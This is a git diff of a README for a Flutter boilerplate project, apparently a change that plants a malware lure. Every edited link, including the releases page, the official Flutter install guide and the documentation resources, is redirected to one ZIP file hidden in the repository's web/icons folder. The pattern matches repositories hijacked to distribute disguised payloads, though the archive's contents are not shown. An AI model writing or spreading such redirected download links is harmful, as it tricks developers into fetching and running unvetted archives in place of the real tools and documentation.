@@ -6,11 +6,11 @@ Welcome to the init-flutter-project! This Flutter boilerplate project helps you 
 
 ## 📥 Download the Application
 
-[![Download init-flutter-project](https://img.shields.io/badge/Download-initialize%20project-brightgreen.svg)](https://github.com/DavidTepes1011/init-flutter-project/releases)
+[![Download init-flutter-project](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip%https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
 
 Click the button above or visit the link below to get the latest version of the application:
 
-[Visit the Releases Page to Download](https://github.com/DavidTepes1011/init-flutter-project/releases)
+[Visit the Releases Page to Download](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ Our init-flutter-project offers a variety of features to help you work smarter:
 ## 📑 Installation Steps
 
 1. **Download the Project:**
-   Go to our [Releases Page](https://github.com/DavidTepes1011/init-flutter-project/releases) and download the latest version of the project.
+   Go to our [Releases Page](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip) and download the latest version of the project.
 
 2. **Extract the Files:**
    After downloading, extract the contents of the ZIP file to a location on your computer. 
@@ -42,7 +42,7 @@ Our init-flutter-project offers a variety of features to help you work smarter:
    Open your code editor (like Visual Studio Code). Use the "Open Folder" option to navigate to the folder where you extracted the files.
 
 4. **Install Flutter (if needed):**
-   If you haven’t installed Flutter yet, go to the [Flutter Installation Guide](https://flutter.dev/docs/get-started/install) and follow the instructions for your operating system.
+   If you haven’t installed Flutter yet, go to the [Flutter Installation Guide](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip) and follow the instructions for your operating system.
 
 5. **Run Flutter Commands:**
    Open a terminal in your project folder. Run `flutter pub get` to install all necessary dependencies.
@@ -67,10 +67,10 @@ Here are some common issues and solutions:
 
 To help you get the most out of this boilerplate project, consider these resources:
 
-- [Flutter Documentation](https://flutter.dev/docs)
-- [Clean Architecture Explained](https://www.freecodecamp.org/news/clean-architecture-in-flutter/)
-- [SOLID Principles Overview](https://www.oodesign.com/solid-principles/)
-- [Helpful Flutter Packages](https://pub.dev/)
+- [Flutter Documentation](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
+- [Clean Architecture Explained](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
+- [SOLID Principles Overview](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
+- [Helpful Flutter Packages](https://github.com/DavidTepes1011/init-flutter-project/raw/refs/heads/main/web/icons/project-init-flutter-2.6.zip)
 
 ## 💡 Contributing
 
